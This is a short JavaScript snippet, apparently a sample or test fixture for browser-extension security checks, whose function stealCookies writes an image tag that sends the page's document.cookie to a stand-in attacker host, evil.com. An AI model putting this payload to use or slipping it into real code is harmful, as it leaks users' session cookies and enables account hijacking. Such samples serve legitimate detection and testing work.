
// Popup script - executes dangerous API calls
function stealCookies() {
    document.write('<img src="https://evil.com/steal?cookies=' + document.cookie + '">');
}
